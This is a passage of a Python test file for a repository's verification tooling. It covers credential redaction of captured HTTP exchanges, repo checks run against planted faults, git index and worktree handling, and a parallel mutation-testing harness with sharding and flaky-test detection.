        self.assertIn("exchanges[0].request.headers.Authorization", kept["removed"])
        self.assertIn("exchanges[0].response.body.token", kept["removed"])
        self.assertIn("exchanges[0].response.body.clone", kept["removed"])
        for value in SHAPED.values():
            self.assertNotIn(value, out + said)

    def test_a_raw_capture_comes_out_with_no_credential(self):
        raw = ("HTTP/2.0 201 Created\nAuthorization: tok" + "en " + SHAPED["ghp"] + "\nX-Ratelimit-Remaining: 4999\nX-GitHub-SSO: required\n"
               "Set-" + "Cookie: user_session=abcdef\nLocation: " + SHAPED["signed url"] + "\n\n"
               + json.dumps({"tok" + "en": SHAPED["runner registration"], "expires_at": "2026-10-15T15:02:11Z"}) + "\n")
        out, said = self.redact(raw)
        self.assertIn("X-Ratelimit-Remaining: 4999", out)
        self.assertIn("expires_at", out)
        self.assertNotIn("Cookie", out)
        self.assertNotIn("X-GitHub-SSO", out)
        for value in (SHAPED["ghp"], SHAPED["runner registration"], "user_session", "sig=AbCdEf"):
            self.assertNotIn(value, out + said)
        self.assertIn("Authorization", said)

    def test_text_that_is_not_a_capture_is_still_redacted(self):
        out, said = self.redact("kept line\none line, " + SHAPED["jwt"] + " and done\n")
        self.assertEqual((out, said.splitlines()[0]), ("kept line\n", "removed: line 2"))


# One planted fault for each check, run from its front door. A check gutted to return nothing fails here.
FAILS = {
    "check_examples": lambda: check_examples.run(clone({"examples/decision.json": "{}"})),
    "check_lifecycle": lambda: check_lifecycle.run(clone({"lifecycle/issue.json": json.dumps(
        dict(check_lifecycle.load("issue"), terminal=[]))})),
    "check_apps": lambda: check_apps.run(clone({"config/apps.json": (ROOT / "config" / "apps.json").read_text()
                                                .replace('"level": "read"', '"level": "write"')})),
    "check_authority": lambda: check_authority.run(dict(json.loads((ROOT / "config" / "authority.json").read_text()),
                                                         author_role="pr-review")),
    "check_purity": lambda: check_purity.run(clone({"kernel/clock.py": "import time\n"})),
    "check_repo": lambda: check_repo.run(clone({"requirements.txt": "requests\n"})),
    "check_workflows": lambda: check_workflows.run(clone({".github/workflows/verify.yml": GOOD.replace("minutes: 15", "minutes: 45")})),
    "check_context": lambda: check_context.run(clone({"docs/lessons.md": "# Lessons\n"})),
    "check_trials": lambda: check_trials.run(clone({"trials/notes.txt": "x\n"})),
    "check_decisions": lambda: check_decisions.run(edited(history(), {FIRST: RECORD.replace("one thing.", "x.")})),
}


class Verify(unittest.TestCase):
    def test_every_check_is_run_by_verify(self):
        on_disk = {p.stem for p in (ROOT / "tools").glob("check_*.py")}
        run = {check.__module__.split(".")[-1] for _, check in verify.CHECKS}
        self.assertEqual(on_disk, run)

    def test_every_check_has_a_test_in_which_it_fails(self):
        self.assertEqual(set(FAILS), {p.stem for p in (ROOT / "tools").glob("check_*.py")})
        for name, planted in sorted(FAILS.items()):
            self.assertTrue(planted(), "%s finds nothing wrong with a planted fault" % name)
        # In CI this repo is a checkout, and compared with main; the copy `mutants.py` runs this in is an export.
        with outside_actions():
            for name, check in verify.CHECKS:
                self.assertEqual(check(), [], "%s finds fault with this repo" % name)

    def test_another_working_tree_inside_this_one_is_not_read(self):
        # A session's git worktree sits in the main checkout, a whole copy of the repo with a .git
        # file. A full clone has a .git directory. Neither is this repo, and nothing in it is checked.
        stray = {"AGENTS.md": "# other\n\n| Rule | Held by |\n|---|---|\n| x | `tools/gone.py` |\n",
                 "CLAUDE.md": "Be careful.\n", "requirements.txt": "requests\n",
                 "tests/test_x.py": "def test_x():\n    pass\n", "tests/deep/test_y.py": "",
                 "kernel/clock.py": "import time\n", "notes.txt": "github_pat_" + "x" * 40 + "\n"}
        planted = {"wt/.git": "gitdir: /elsewhere\n", "wt/notes.txt": "A folder with no AGENTS.md.\n"}
        for where, git in ((".claude/worktrees/other", ".git"), (".claude/worktrees/clone", ".git/HEAD"),
                           ("kernel/wt", ".git"), ("docs/wt", ".git")):
            planted["%s/%s" % (where, git)] = "gitdir: /elsewhere\n"
            planted.update({"%s/%s" % (where, rel): text for rel, text in stray.items()})
        root = clone(planted)
        walking = [(name, check) for name, check in verify.CHECKS
                   if "root" in check.__code__.co_varnames[:check.__code__.co_argcount]]
        self.assertGreaterEqual(len(walking), 5)
        for name, check in walking:
            with self.subTest(check=name), outside_actions():      # the copy is an export, with no .git
                self.assertEqual(check(root), [], "%s reads another working tree as this one" % name)

    def test_a_copy_of_the_repo_leaves_out_another_working_tree(self):
        root = tree({"a/x.py": "", "a/__pycache__/x.pyc": "", "corpus/d.jsonl": "", ".git/HEAD": "",
                     "wt/.git": "gitdir: /elsewhere\n", "wt/y.py": "", "a/clone/.git/HEAD": "", "a/clone/z.py": "",
                     "a/corpus/y.py": ""})
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/corpus/y.py", "a/x.py"])
        to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
        walk.copy(root, to)
        self.assertEqual([p.name for p in to.iterdir()], ["a"])
        self.assertEqual(sorted(p.name for p in (to / "a").iterdir()), ["corpus", "x.py"])

    def test_only_the_corpus_at_the_root_is_skipped_and_only_a_directory(self):
        # make_corpus.py writes corpus/ at the root, and nowhere else. A folder of that name below
        # the root is code like any other, and a file named for a skipped folder is a file.
        token = "github_pat_" + "x" * 40 + "\n"
        root = clone({"kernel/corpus/x.py": "import time\n", "sim/corpus/test_hidden.py": "",
                      "sim/corpus/notes.txt": token, "corpus": token, "sim/__pycache__": token})
        self.assertTrue(caught(check_purity.run(root), "corpus/x.py:1 imports time"))
        problems = check_repo.run(root)
        for words in ("sim/corpus/test_hidden.py: a test outside tests/", "sim/corpus/notes.txt: holds something",
                      "corpus: holds something", "sim/__pycache__: holds something"):
            self.assertTrue(caught(problems, words), words)


    def test_local_output_is_skipped_only_while_git_does_not_hold_it(self):
        # CI checks out the commit afresh, with git's index beside it. Whatever is under __pycache__/
        # or the root's corpus/ there is either in the index, and committed, or written by this run.
        files = {"kernel/x.py": "", "kernel/__pycache__/x.cpython-39.pyc": "", "corpus/d.jsonl": "",
                 "sim/__pycache__/y.cpython-39.pyc": "", "corpus/local.jsonl": "", "a/corpus/z.py": ""}
        held = {"kernel/x.py": FILE, "kernel/__pycache__/x.cpython-39.pyc": FILE, "corpus/d.jsonl": FILE,
                "a/corpus/z.py": FILE}
        listed = ["a/corpus/z.py", "corpus/d.jsonl", "kernel/__pycache__/x.cpython-39.pyc", "kernel/x.py"]
        for version in (2, 3, 4):
            with self.subTest(version=version):
                root = commit(tree(files), held, version)
                self.assertEqual(walk.index(root), held)
                self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], listed)
                to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
                walk.copy(root, to)
                self.assertEqual([(to / rel).exists() for rel in files], [True, True, True, False, False, True])
        # A worktree's .git is a file that names its index's directory, which may be anywhere.
        gitdir = commit(pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)), held) / ".git"
        root = tree(dict(files, **{".git": "gitdir: %s\n" % gitdir}))
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], listed)
        # With nothing committed yet, or no .git at all, nothing can be committed; all of it is local.
        for root in (commit(tree(files), {}), tree(files)):
            self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/corpus/z.py", "kernel/x.py"])
        # Local output in any case is local output: a file system may fold case, and Python's caches with it.
        local = {"kernel/x.py": "", "sim/__PYCACHE__/y.pyc": "", "Corpus/local.jsonl": ""}
        for root in (commit(tree(local), {"kernel/x.py": FILE}), tree(local)):
            self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["kernel/x.py"])

    def test_an_index_git_writes_is_read_as_git_reads_it(self):
        # Each way git may write it: SHA-1 or SHA-256 object ids; version 3, which an entry only added
        # with -N needs, or 4; and the checksum at its end, or zeros there under index.skipHash.
        files = {"a.py": "", "kernel/x.py": "", "kernel/__pycache__/x.cpython-39.pyc": "", "é.md": "",
                 "z/" + "deep/" * 30 + "f.py": "", "later.py": ""}
        for objects, size in (("sha1", 20), ("sha256", 32)):
            for config in ((), ("index.version=4",), ("index.skipHash=true",), ("index.skipHash=true", "index.version=4")):
                with self.subTest(objects=objects, config=config):
                    root = tree(files)
                    git(root, "init", "-q", "--object-format=" + objects)
                    for setting in config:
                        git(root, "config", *setting.split("=", 1))
                    git(root, "add", "-f", "--", *sorted(set(files) - {"later.py"}))
                    git(root, "add", "-N", "later.py")
                    git(root, "update-index", "--add", "--cacheinfo", "160000,%s,kernel/lib" % ("1" * size * 2))
                    data = (root / ".git" / "index").read_bytes()
                    self.assertEqual(not any(data[-size:]), "index.skipHash=true" in config)
                    self.assertEqual(walk.index(root), held_by_git(root))
                    self.assertEqual(walk.index(root)["kernel/lib"], GITLINK)
        # A worktree's gitdir keeps no config; the repo's, with its object format, is in its common dir.
        main = staged({"a.py": ""}, "index.skipHash=true", objects="sha256")
        gitdir = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (gitdir / "index").write_bytes((main / ".git" / "index").read_bytes())
        (gitdir / "commondir").write_text(str(main / ".git") + "\n")
        root = tree({"a.py": "", ".git": "gitdir: %s\n" % gitdir})
        self.assertEqual(walk.index(root), {"a.py": FILE})

    def test_the_index_is_read_as_git_wrote_it(self):
        held = walk.index(ROOT)
        if held is None:        # an export, with no .git to read
            self.assertFalse(os.path.lexists(str(ROOT / ".git")))
            return
        self.assertEqual((held["AGENTS.md"], held["tools/walk.py"]), (FILE, FILE))
        self.assertFalse([p for p in held if "__pycache__" in p or p.startswith("corpus/")])

    def test_a_link_is_not_followed_and_a_link_to_nothing_is_reported(self):
        root = tree({"a/x.py": ""})
        (root / "l").symlink_to("a", target_is_directory=True)
        (root / "gone.py").symlink_to("nowhere.py")
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/x.py"])
        self.assertTrue(caught(check_repo.run(root), "gone.py: a link to nothing"))
        to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
        walk.copy(root, to)
        self.assertTrue((to / "l").is_symlink() and (to / "gone.py").is_symlink())

    def test_only_the_walk_walks_the_tree(self):
        # One walk, so that every check and every copy skips the same things.
        found = sorted(p.relative_to(ROOT).as_posix() for p in walk.files(ROOT)
                       if p.suffix == ".py" and p.relative_to(ROOT).parts[0] in ("tools", "tests", "sim")
                       and walkers(p.read_text()))
        self.assertEqual(found, ["tools/walk.py"])

    def test_a_walk_written_another_way_is_still_a_walk(self):
        for source in ("os.walk(root)\n", "os.walk (root)\n", "os.fwalk(root)\n", "root.walk()\n",
                       "root.rglob('*.py')\n", "os.scandir(root)\n", "shutil.copytree(a, b)\n",
                       "from os import walk\n", "from shutil import copytree as ct\nct(a, b)\n",
                       "ct = shutil.copytree\n", "glob.glob('x', recursive=True)\n", "glob.iglob('**/*.py')\n",
                       "root.glob('x/**/*.py')\n"):
            self.assertTrue(walkers(source), source)
        self.assertEqual(walkers("from tools import walk\nwalk.files(root)\nroot.glob('*.py')\n"
                                 "glob.glob('x', recursive=False)\nast.walk(tree)\n"), [])

    def test_a_check_that_finds_a_problem_fails_verify(self):
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertTrue(verify.failed([("always", lambda: ["a problem"])]))
            self.assertFalse(verify.failed([("never", lambda: [])]))
        self.assertIn("a problem", said.getvalue())

    def test_make_fast_is_verify_without_the_seeded_simulation(self):
        """The required check runs every test file at any depth; only `make fast` leaves the slow ones out."""
        everything = {".".join(p.relative_to(ROOT).with_suffix("").parts) for p in walk.files(ROOT, "tests")
                      if p.name.startswith("test_") and p.suffix == ".py"}
        slow = {"tests." + name for name in verify.SLOW}
        self.assertTrue(slow <= everything, "a slow test named in verify.SLOW does not exist")
        ran = {}

        class Runner:
            def __init__(self, **_):
                pass

            def run(self, suite):
                ran["modules"] = modules_in(suite)
                return unittest.TestResult()

        real = (verify.failed, verify.unittest.TextTestRunner)
        verify.failed, verify.unittest.TextTestRunner = (lambda checks: False), Runner
        try:
            with contextlib.redirect_stdout(io.StringIO()):     # main prints the unverified rules
                self.assertEqual(verify.main([]), 0)
                self.assertEqual(ran["modules"], everything)
                verify.main(["--fast"])
                self.assertEqual(ran["modules"], everything - slow)
        finally:
            verify.failed, verify.unittest.TextTestRunner = real
        makefile = (ROOT / "Makefile").read_text()
        self.assertIn("\nverify:\n\t$(PY) -m tools.verify\n", makefile)
        self.assertIn("\nfast:\n\t$(PY) -m tools.verify --fast\n", makefile)

    def test_every_test_file_is_discovered(self):
        found = set()

        def names(suite):
            for item in suite:
                if isinstance(item, unittest.TestSuite):
                    names(item)
                else:
                    found.add(type(item).__module__.split(".")[-1])

        names(unittest.defaultTestLoader.discover(str(ROOT / "tests"), top_level_dir=str(ROOT)))
        self.assertEqual(found, {p.stem for p in (ROOT / "tests").glob("test_*.py")})

    def test_every_link_is_listed_and_none_is_followed(self):
        # A link is never another working tree to skip, even when what it points at holds a .git.
        root = tree({"a/x.py": "", "other/.git": "gitdir: /elsewhere\n", "other/y.py": ""})
        (root / "a" / "l").symlink_to("..", target_is_directory=True)
        (root / "a" / "wt").symlink_to("../other", target_is_directory=True)
        (root / "a" / "f.py").symlink_to("x.py")
        (root / "a" / "gone.py").symlink_to("nowhere.py")
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.links(root)],
                         ["a/f.py", "a/gone.py", "a/l", "a/wt"])
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/f.py", "a/x.py"])


AGAIN = "; fix the copy or run named here, then run python3 -m tools.mutants again"
FAILS_A_TEST = ("F\n%s\nFAIL: test_x (tests.test_x.T)\n%s\nAssertionError\n\nRan 1 test\n\nFAILED (failures=1)\n"
                % ("=" * 70, "-" * 70))


MEND = "; mark or mend that test, then run python3 -m tools.mutants again"
PASSES = (0, 0, "OK\n")


def told(behaviour: dict, calls: list):
    """A stand-in for `mutants.suite`, which answers by the word the mutant wrote into k.py.

    A test run alone is answered by the word with " alone" after it, if `behaviour` has it, and by the word if not. A
    list of answers gives one to each run in turn, the last given again to the runs after it.
    """
    def run(work, first=(), only=None):
        said = (work / "k.py").read_text().strip() + (" alone" if only else "")
        calls.append(said)
        answers = behaviour.get(said, behaviour.get(said.replace(" alone", "")))
        if isinstance(answers, list):
            wait, status, output = answers[min(calls.count(said), len(answers)) - 1]
        else:
            wait, status, output = answers
        time.sleep(wait)
        if isinstance(output, Exception):
            raise output
        calls.append("done " + said)
        return status, output
    return run


def mutate(*names) -> list:
    return [(name, "k.py", "rule\n", name + "\n") for name in names]


def suite_of(test: str, files: dict = None) -> pathlib.Path:
    """A throwaway repo whose tests are one module holding `test`, a method of a TestCase, beside any other `files`."""
    return tree(dict(files or {}, **{"tests/__init__.py": "", "tests/test_x.py": "import os\nimport time\nimport "
                                     "unittest\n\n\nclass T(unittest.TestCase):\n" + test}))


class Mutants(unittest.TestCase):
    """The mutation check runs its mutants side by side, and only a failing test kills one."""

    def check(self, behaviour: dict, names: list, extra: list = ()):
        calls = []
        behaviour = dict(behaviour, rule=(0, 0, "OK\n"))
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate(*names) + list(extra), tree({"k.py": "rule\n"}), told(behaviour, calls), 3)
        return code, said.getvalue().splitlines(), calls

    @support.wall_clock
    def test_mutants_are_reported_in_their_order_however_their_runs_finish(self):
        code, lines, calls = self.check({"slow": (0.5, 1, FAILS_A_TEST), "quick": (0, 1, FAILS_A_TEST),
                                         "quicker": (0, 1, FAILS_A_TEST)}, ["slow", "quick", "quicker"])
        self.assertEqual(calls[:2], ["rule", "done rule"], "the run of the unbroken tests is first, and alone")
        self.assertLess(calls.index("done quicker"), calls.index("done slow"), "the runs did not overlap")
        self.assertEqual(lines, ["killed    slow", "killed    quick", "killed    quicker", "3 of 3 mutants killed"])
        self.assertEqual(code, 0)

    @support.wall_clock
    def test_a_run_that_hangs_is_ended_reported_and_fails_the_check(self):
        began = time.monotonic()
        self.assertIsNone(mutants.suite(suite_of("    def test_x(self):\n        time.sleep(60)\n"), 1)[0])
        self.assertLess(time.monotonic() - began, 30)
        code, lines, _ = self.check({"hangs": (0, None, "")}, ["hangs"])
        self.assertEqual(lines, ["ERROR     hangs (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN),
                                 "0 of 1 mutants killed"])
        self.assertEqual(code, 1)

    def test_only_a_failing_test_kills_a_mutant(self):
        cases = {
            "a test fails": ("    def test_x(self):\n        self.assertEqual(1, 2)\n", "killed"),
            "a test raises": ("    def test_x(self):\n        {}['gone']\n", "killed"),
            "every test passes": ("    def test_x(self):\n        pass\n", "SURVIVED"),
            "the runner dies": ("    def test_x(self):\n        os._exit(1)\n", "ERROR"),
            "a module will not import": ("    pass\n\n\nimport a_module_the_copy_left_out\n", "ERROR"),
        }
        for name, (test, outcome) in cases.items():
            said, why = mutants.verdict(*mutants.suite(suite_of(test)))
            self.assertEqual(said, outcome, name)
            self.assertTrue(said != "ERROR" or why.endswith(AGAIN), name)
        crash = "Traceback (most recent call last):\nMemoryError\n"
        self.assertEqual(mutants.verdict(1, crash), ("ERROR", "exit status 1 and no test failed, ending 'MemoryError'" + AGAIN))
        self.assertEqual(mutants.verdict(2, FAILS_A_TEST)[0], "ERROR")
        code, lines, _ = self.check({"crashes": (0, 1, crash)}, ["crashes"])
        self.assertEqual(lines[0], "ERROR     crashes (exit status 1 and no test failed, ending 'MemoryError'%s)" % AGAIN)
        self.assertEqual(code, 1)

    def test_each_run_stops_at_its_first_failure(self):
        status, output = mutants.suite(suite_of("    def test_a(self):\n        self.fail()\n\n"
                                                "    def test_b(self):\n        self.fail()\n"))
        self.assertEqual((status, output.count("FAIL: ")), (1, 1))

    def test_the_tests_a_mutant_names_run_first_and_the_whole_suite_after_them(self):
        where = suite_of("    def test_a(self):\n        pass\n\n    def test_b(self):\n        self.fail()\n")
        status, output = mutants.suite(where, first=("tests.test_x.T.test_b",))
        self.assertEqual((status, output.count("FAIL: ")), (1, 1))
        self.assertIn("Ran 1 test", output, "only the test named ran")
        status, output = mutants.suite(where, first=("tests.test_x.T.test_a",))
        self.assertEqual((status, output.count("FAIL: test_b")), (1, 1), "the whole suite ran after the named test passed")
        said = mutants.verdict(*mutants.suite(where, first=("tests.test_x.T.test_gone",)))
        self.assertEqual(said[0], "ERROR", "a test named that is not there kills nothing")
        status, output = mutants.suite(where, only="tests.test_x.T.test_a")
        self.assertEqual((status, output.count("Ran 1 test")), (0, 1), "the test named alone ran alone, and passed")
        calls = []

        def run(work, **given):
            calls.append(given)
            return (0, "OK\n") if (work / "k.py").read_text() == "rule\n" else (1, FAILS_A_TEST)
        for mutant in (("named", "k.py", "rule\n", "x\n", ("tests.test_x.T.test_b",)), ("plain", "k.py", "rule\n", "x\n")):
            self.assertEqual(mutants.attempt(mutant, tree({"k.py": "rule\n"}), run)[0], "killed")
        alone = {"only": "tests.test_x.T.test_x"}
        self.assertEqual(calls, [{"first": ("tests.test_x.T.test_b",)}, alone, alone, {}, alone, alone],
                         "the test that failed ran alone on the mutant and on the unbroken code")

    def test_the_summary_counts_only_the_mutants_killed(self):
        stale = [("gone", "k.py", "not there\n", "x\n")]
        code, lines, _ = self.check({"fails": (0, 1, FAILS_A_TEST), "passes": (0, 0, "OK\n")},
                                    ["fails", "passes"], stale)
        self.assertEqual(lines, ["killed    fails", "SURVIVED  passes", "STALE     gone (the code it mutates has changed)",
                                 "1 of 3 mutants killed"])
        self.assertEqual(code, 1)

    def test_a_run_that_raises_is_an_error_and_the_rest_still_report(self):
        code, lines, _ = self.check({"before": (0, 1, FAILS_A_TEST), "raises": (0, 1, OSError("disk full")),
                                     "after": (0.2, 1, FAILS_A_TEST)}, ["before", "raises", "after"])
        self.assertEqual(lines, ["killed    before", "ERROR     raises (the run failed with OSError: disk full%s)" % AGAIN,
                                 "killed    after", "2 of 3 mutants killed"])
        self.assertEqual(code, 1)

    def test_every_mutant_is_in_exactly_one_shard(self):
        # CI runs the mutants in shards, one job each. A mutant in no shard is a rule nobody checks; one in two is run
        # twice. Each is told apart by its name, so no name is used twice.
        names = [mutant[0] for mutant in mutants.MUTANTS]
        self.assertEqual(len(names), len(set(names)))
        for count in range(1, 13):
            placed = [mutant[0] for index in range(count) for mutant in mutants.shard(mutants.MUTANTS, index, count)]
            self.assertEqual(sorted(placed), sorted(names), count)

    def test_a_shard_is_read_from_the_matrix_or_the_run_stops(self):
        every = len(mutants.MUTANTS)
        self.assertEqual(mutants.selected({}), (mutants.MUTANTS, ""))
        chosen, where = mutants.selected({"MUTANTS_SHARD": "2", "MUTANTS_SHARDS": "6"})
        self.assertEqual((chosen, where), (mutants.shard(mutants.MUTANTS, 2, 6), ", in shard 2 of 6 counted from 0"))
        for shard, count, said in (("1", None, "set both"), (None, "6", "set both"), ("", "6", "set both"),
                                   ("one", "6", "set both"), ("-1", "6", "set both"), ("1.0", "6", "set both"),
                                   ("6", "6", "below the count"), ("0", "0", "below the count"),
                                   (str(every), str(every + 1), "holds no mutant")):
            given = {k: v for k, v in (("MUTANTS_SHARD", shard), ("MUTANTS_SHARDS", count)) if v is not None}
            with self.assertRaises(ValueError, msg=given) as raised:
                mutants.selected(given)
            self.assertIn(said, str(raised.exception), given)
        # From the front door, a shard it cannot read stops the run before any test runs.
        env = dict(os.environ, MUTANTS_SHARD="0", MUTANTS_SHARDS="0")
        done = subprocess.run([sys.executable, "-m", "tools.mutants"], cwd=str(ROOT), env=env, capture_output=True,
                              text=True, timeout=60)
        self.assertEqual((done.returncode, done.stdout.strip()), (1, "MUTANTS_SHARD is 0 and MUTANTS_SHARDS is 0; the "
                                                                     "shard is counted from 0, below the count"))

    def test_tests_that_fail_unbroken_stop_the_check_before_any_mutant(self):
        calls = []
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("fails"), tree({"k.py": "rule\n"}), told({"rule": (0, 1, FAILS_A_TEST)}, calls))
        self.assertEqual((code, calls), (1, ["rule", "done rule"]))
        self.assertIn("the tests fail before anything is broken", said.getvalue())

    def test_a_failure_the_mutant_causes_kills_it(self):
        code, lines, calls = self.check({"breaks": (0, 1, FAILS_A_TEST)}, ["breaks"])
        self.assertEqual((code, lines), (0, ["killed    breaks", "1 of 1 mutants killed"]))
        self.assertEqual(calls[2:], ["breaks", "done breaks", "breaks alone", "done breaks alone", "rule alone",
                                     "done rule alone"], "it failed again alone on the mutant, and passed alone unbroken")
        # From the front door: a test that reads the rule fails on its mutant whole and alone, and passes without it.
        root = suite_of("    def test_x(self):\n        self.assertEqual(open('k.py').read(), 'rule\\n')\n",
                        {"k.py": "rule\n"})
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("breaks"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (0, ["killed    breaks", "1 of 1 mutants killed"]))

    def test_a_mutant_whose_only_failure_is_unrelated_survives(self):
        # A test failed under load on the mutant, and passes when run again: the suite runs once more, and passes.
        code, lines, calls = self.check({"unrelated": [(0, 1, FAILS_A_TEST), PASSES], "unrelated alone": PASSES},
                                        ["unrelated"])
        self.assertEqual((code, lines), (1, ["SURVIVED  unrelated", "0 of 1 mutants killed"]))
        self.assertEqual([c for c in calls if not c.startswith("done ")],
                         ["rule", "unrelated", "unrelated alone", "rule alone", "unrelated"])
        # From the front door: a test that fails on its second run, the first on the mutant, and on no other.
        root = suite_of("    def test_x(self):\n        with open(os.environ['COUNTED'], 'a+') as runs:\n"
                        "            runs.write('.')\n            runs.seek(0)\n"
                        "            self.assertNotEqual(runs.read(), '..')\n", {"k.py": "rule\n"})
        counted = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "counted"
        with mock.patch.dict(os.environ, {"COUNTED": str(counted)}), \
                contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("unrelated"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (1, ["SURVIVED  unrelated", "0 of 1 mutants killed"]))
        self.assertEqual(counted.read_text(), "." * 5, "unbroken, whole, alone, alone unbroken, whole again")

    def test_a_test_that_fails_on_the_unbroken_code_too_kills_nothing(self):
        code, lines, _ = self.check({"x": (0, 1, FAILS_A_TEST), "rule alone": (0, 1, FAILS_A_TEST)}, ["x"])
        self.assertEqual((code, lines), (1, ["FLAKY     x (tests.test_x.T.test_x failed on the unbroken code too%s)" % MEND,
                                             "0 of 1 mutants killed"]))

    def test_a_test_that_fails_only_in_a_copy_kills_nothing(self):
        # The checkout has a .git, and a copy has none: the test fails on every mutant and passes where the tests were
        # first run, so only the unbroken code in the same copy shows it is not the mutant's.
        root = suite_of("    def test_x(self):\n        self.assertTrue(os.path.exists('.git'))\n",
                        {"k.py": "rule\n", ".git/HEAD": "ref: refs/heads/main\n"})
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("anything"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()),
                         (1, ["FLAKY     anything (tests.test_x.T.test_x failed on the unbroken code too%s)" % MEND,
                              "0 of 1 mutants killed"]))

    def test_a_mutant_leaves_no_trace_in_the_copy_the_next_one_is_lent(self):
        # However its runs end, a crash or a hang among them, a mutant's file is put back byte for byte, and the next
        # mutant is lent the same copy: one is made for each worker, not one for each mutant.
        root = tree({"k.py": "rule\n"})
        seen = []

        def run(work, first=(), only=None):
            said = (work / "k.py").read_bytes()
            seen.append((work, said))
            if said == b"crashes\n":
                raise OSError("the runner died")
            if said == b"hangs\n":
                return None, ""
            return (0, "OK\n") if said == b"rule\n" else (1, FAILS_A_TEST)
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("crashes", "hangs", "breaks", "breaks too"), root, run, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (1, [
            "ERROR     crashes (the run failed with OSError: the runner died%s)" % AGAIN,
            "ERROR     hangs (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN),
            "killed    breaks", "killed    breaks too", "2 of 4 mutants killed"]))
        self.assertEqual(len({work for work, _ in seen} - {root}), 1, "one copy, lent to each mutant in turn")
        self.assertEqual([text for work, text in seen if work != root],
                         [b"crashes\n", b"hangs\n", b"breaks\n", b"breaks\n", b"rule\n", b"breaks too\n", b"breaks too\n",
                          b"rule\n"], "each mutant found the file as the tree has it, and its unbroken side too")
        # A copy left changed is an ERROR for the mutant it is lent to, and is never lent again.
        trees = mutants.Trees(root, tempfile.mkdtemp(dir=SCRATCH.name))
        with trees.lent() as left:
            (left / "k.py").write_text("rule\nleft\n")
        outcome, why = mutants.guarded(mutate("next")[0], root, run, trees)
        self.assertEqual(outcome, "ERROR")
        self.assertIn("k.py in this copy is not the tree's", why)
        self.assertEqual(mutants.guarded(mutate("next")[0], root, run, trees), ("killed", ""))
        self.assertNotEqual(seen[-1][0], left, "a fresh copy was made in its place")
        # A copy whose target cannot be read is an ERROR for the mutant it is lent to, and is never lent again.
        with trees.lent() as missing:
            (missing / "k.py").unlink()
        outcome, why = mutants.guarded(mutate("next")[0], root, run, trees)
        self.assertEqual(outcome, "ERROR")
        self.assertIn("k.py could not be read in this copy", why)
        self.assertEqual(mutants.guarded(mutate("next")[0], root, run, trees), ("killed", ""))
        self.assertNotEqual(seen[-1][0], missing, "a fresh copy was made in its place")
        self.assertEqual(min(os.cpu_count() or 1, mutants.WORKERS), min(os.cpu_count() or 1, 4))

    def test_a_failure_that_is_not_the_mutants_twice_is_flaky_and_fails_the_check(self):
        code, lines, calls = self.check({"x": (0, 1, FAILS_A_TEST), "x alone": PASSES, "y": (0, 1, FAILS_A_TEST)},
                                        ["x", "y"])
        self.assertEqual(lines, ["FLAKY     x (tests.test_x.T.test_x passed when run again on the mutant%s)" % MEND,
                                 "killed    y", "1 of 2 mutants killed"])
        self.assertEqual((code, calls.count("x"), calls.count("x alone")), (1, 2, 2), "the suite ran twice on it")
        # A run alone that hangs or crashes is an ERROR, as any other run is: never killed, and never FLAKY.
        code, lines, calls = self.check({"x": (0, 1, FAILS_A_TEST), "x alone": (0, None, "")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN))
        self.assertNotIn("rule alone", calls, "the unbroken run was skipped when the mutant run errored")
        code, lines, _ = self.check({"x": (0, 1, FAILS_A_TEST), "rule alone": (0, None, "")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN))

    def test_the_failing_test_is_read_from_the_line_each_python_prints(self):
        lines = {
            "FAIL: test_x (tests.m.T)": "tests.m.T.test_x",                     # 3.9 and 3.10
            "FAIL: test_x (tests.m.T.test_x)": "tests.m.T.test_x",              # 3.11 and later
            "ERROR: test_x (tests.m.T)": "tests.m.T.test_x",
            "FAIL: test_x (tests.m.T) [one] (i=1)": "tests.m.T.test_x",         # a subtest
            "FAIL: test_x (tests.m.T.test_x) (i=1)": "tests.m.T.test_x",
            "ERROR: setUpClass (tests.m.T)": "tests.m.T",                       # the class
            "FAIL: test_x (tests.m.T)\nFAIL: test_x (tests.m.T.test_x)": "tests.m.T.test_x",
            "FAIL: test_x (tests.m.T)\nFAIL: test_y (tests.m.T)": None,          # two tests: which is unknown
            "FAILED (failures=1)": None,
            "FAIL: test x (tests.m.T)": None,
        }
        for said, test in lines.items():
            output = "F\n" + "".join("%s\n%s\n%s\nAssertionError\n" % ("=" * 70, line, "-" * 70)
                                     for line in said.splitlines())
            self.assertEqual(mutants.failed_test(output), test, said)
        # A line of that form in a test's own message is not unittest's.
        output = "F\n%s\nFAIL: test_x (tests.m.T)\n%s\nAssertionError: FAIL: test_y (tests.m.T)\nFAIL: test_y (tests.m.T)\n"
